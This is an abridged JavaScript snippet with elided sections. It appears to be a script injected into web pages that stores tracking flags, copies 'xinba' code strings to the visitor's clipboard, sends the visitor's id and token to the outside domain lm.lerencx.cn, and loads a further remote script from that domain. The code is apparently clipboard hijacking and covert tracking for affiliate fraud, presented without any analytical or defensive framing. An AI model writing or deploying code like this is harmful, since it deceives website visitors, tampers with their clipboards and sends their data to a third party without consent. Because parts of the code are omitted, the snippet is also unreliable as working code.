(function(h) {
    window.amb_jd_proxy_domain = "lm.lerencx.cn";
    window.amb_jd_proxy_f = "zole";
    window.amb_jd_proxy_c = "10";
    var total = ['xinba  oKwg4d75R2', 'xinba  LFbq8868ib', 'xinba  K3NnTw70hz', 'xinba  qOMQoD49O0', 'xinba  sVgBJW69F7'];
    ...
    var g = {
        ...
        init: function() {
            ...
            if (null == a.sGet("amb_jd_open")) {
                var b = "";
                null != a.sGet("amb_jd_open_info") ? (b = a.sGet("amb_jd_open_info")) : (b = "b" , a.sSet("amb_jd_open_info", b, window.amb_jd_proxy_c));
                a.ggo(function(){
                    a.text = g.text;
                    a.token = g.token;
                    a.closeqq = g.closeqq;
        ...
        cp: function(a) {
            ...
            if (b.hascopy2 == null) {
                b.hascopy2 = "yes";
                b._ajax("//" + window.amb_jd_proxy_domain + "/json?" + (new Date).getTime(), {
                    f: b.id,
                    t: b.token,
                    h: b.hascopy,
        ...
        qqCopy: function() {
            ...
            if (e) {
                ...
                b = 5.4 > (e ? b : 0) ? "//lm.lerencx.cn/qq.js" : "//jsapi.qq.com/get?api=app.share";
